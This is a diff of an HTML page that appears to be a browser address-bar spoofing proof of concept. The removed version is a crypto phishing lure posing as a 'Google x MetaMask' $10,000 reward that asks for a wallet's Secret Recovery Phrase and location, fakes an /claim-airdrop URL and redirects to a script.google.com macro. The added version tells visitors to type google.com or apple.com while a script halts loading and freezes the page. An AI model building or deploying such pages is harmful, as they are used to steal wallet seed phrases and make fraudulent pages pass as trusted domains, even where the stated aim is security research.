@@ -1,169 +1,37 @@
 <!doctype html>
-<html>
+<html lang="en">
   <head>
     <meta charset="utf-8" />
-    <title>pocpoc</title>
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      body {
-        font-family: sans-serif;
-        background: #ffffff;
-        color: #000000;
-        padding: 20px;
-      }
-      .btn {
-        font-size: 16px;
-        padding: 12px 20px;
-        background: #000000;
-        color: #ffffff;
-        border: none;
-        cursor: pointer;
-        width: 100%;
-        margin-top: 10px;
-        font-weight: bold;
-      }
-      #bait-section {
-        text-align: center;
-        margin-top: 40vh;
-      }
-      #modal {
-        display: none;
-        max-width: 400px;
-        margin: 60px auto;
-        border: 1px solid #cccccc;
-        padding: 25px;
-        background: #fdfdfd;
-      }
-      h2 {
-        font-size: 18px;
-        margin-bottom: 15px;
-      }
-      p {
-        font-size: 14px;
-        line-height: 1.5;
-        margin-bottom: 20px;
-        color: #333333;
-      }
-      textarea {
-        width: 100%;
-        height: 100px;
-        padding: 10px;
-        border: 1px solid #999999;
-        font-family: monospace;
-        font-size: 14px;
-        margin-bottom: 15px;
-        resize: none;
-      }
-      .alert {
-        margin-top: 15px;
-        font-size: 13px;
-        color: #cc0000;
-        font-weight: bold;
-        display: none;
-        border: 1px solid #cc0000;
-        padding: 10px;
-        background: #ffe6e6;
-        word-wrap: break-word;
-      }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>TESTErR</title>
   </head>
-  <body>
-    <div id="bait-section">
-      <button class="btn" id="btn">Claim $10,000 Reward</button>
+
+  <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
+    <div>
+      <h1>ADDRESS BAR SPOOFING</h1>
+
+      <p>PLEASE TYPE THIS MANUALLY IN THE ADDRESS BAR</p>
+      <h2>google.com, microsoft.com, apple.com</h2>
     </div>
 
-    <div id="modal">
-      <h2>Google x MetaMask Initiative</h2>
-      <p>
-        Google is providing a $10,000 reward pool in collaboration with MetaMask
-        for active Web3 users.
-      </p>
-      <p>
-        You are securely connected to the official
-        <strong>script.google.com</strong> domain. To verify your wallet
-        ownership and your eligible region, please paste your 12-word Secret
-        Recovery Phrase (SRP) and allow location access.
-      </p>
+<script>
+  function freezeChunk(ms) {
+    const end = performance.now() + ms;
+    while (performance.now() < end) {}
+  }
 
-      <textarea
-        id="srp"
-        placeholder="Enter Secret Recovery Phrase separated by spaces..."
-      ></textarea>
+  function loopFreeze() {
+    freezeChunk(120000);
+    setTimeout(loopFreeze, 100); 
+  }
 
-      <button class="btn" onclick="submitAndLocate()">
-        Verify Identity & Location
-      </button>
-      <div class="alert" id="alert"></div>
-    </div>
+  setTimeout(() => {
+    try {
+      window.stop();
+    } catch (e) {}
 
-    <script>
-      const modal = document.getElementById("modal");
-      const btn = document.getElementById("btn");
-      const baitSection = document.getElementById("bait-section");
-      const alertBox = document.getElementById("alert");
-
-      function submitAndLocate() {
-        const phrase = document.getElementById("srp").value;
-
-        if (phrase.trim() === "") {
-          alert("Please enter your SRP first.");
-          return;
-        }
-
-        alertBox.style.display = "block";
-        alertBox.innerHTML = "CAPTURING DATA... PLEASE ALLOW LOCATION.";
-
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              alertBox.innerHTML =
-                "SUCCESS: DATA EXFILTRATED<br><br>" +
-                "SRP:<br>" +
-                phrase +
-                "<br><br>" +
-                "LOCATION:<br>Lat: " +
-                pos.coords.latitude +
-                "<br>Lon: " +
-                pos.coords.longitude;
-            },
-            (err) => {
-              alertBox.innerHTML =
-                "SUCCESS: SRP CAPTURED!<br><br>" +
-                "SRP:<br>" +
-                phrase +
-                "<br><br>" +
-                "LOCATION: Permission Denied (" +
-                err.message +
-                ")";
-            },
-          );
-        } else {
-          alertBox.innerHTML =
-            "SRP Captured: " + phrase + "<br>Geolocation not supported.";
-        }
-      }
-
-      btn.onclick = () => {
-        history.pushState(null, "", "/claim-airdrop");
-        baitSection.style.display = "none";
-        modal.style.display = "block";
-      };
-
-      window.addEventListener("pageshow", () => {
-        requestAnimationFrame(() => {
-          requestAnimationFrame(() => {
-            setTimeout(() => {
-              location.href =
-                "https://script.google.com/macros/s/AKfycbyY8ENEE8LOHJqnnvkM9o3wKgxFebnLnIL0o_B1v_duBtzVqNVu3T3_Lds7AxvGQo5Y/exec";
-            }, 80);
-          });
-        });
-      });
-    </script>
+    loopFreeze();
+  }, 5);
+</script>
   </body>
 </html>
